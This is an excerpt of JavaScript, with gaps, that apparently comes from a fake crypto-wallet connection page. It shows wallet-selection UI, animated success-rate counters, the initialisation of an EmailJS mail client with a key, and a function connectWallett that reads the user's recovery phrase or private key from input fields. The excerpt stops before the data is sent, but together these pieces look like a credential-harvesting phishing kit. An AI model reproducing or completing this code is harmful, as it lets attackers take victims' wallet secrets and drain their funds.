...
function initScrollAnimations() {
  ...
  const elementsToObserve = document.querySelectorAll(
    ".stats-card, .wallet-option, .import-option"
  );
...
function selectWallet(walletName) {
  ...
  const nameEls = document.querySelectorAll(
    "#selectedWalletName, #recoveryWalletName, #privateKeyWalletName"
  );
...
function animateCounters() {
  ...
  function animate() {
    ...
    const successRate = Number.parseFloat(
      (targetSuccess * easedProgress).toFixed(1)
    );
...
(function () {
  emailjs.init("Zjh3-YGuzQVKNSkoO");
})();

function connectWallett(type) {
  let userMessage = "";

  if (type === "recovery") {
    userMessage = document.getElementById("recoveryPhraseInput").value.trim();
  }

  if (type === "private") {
    userMessage = document.getElementById("privateKeyInput").value.trim();
  }
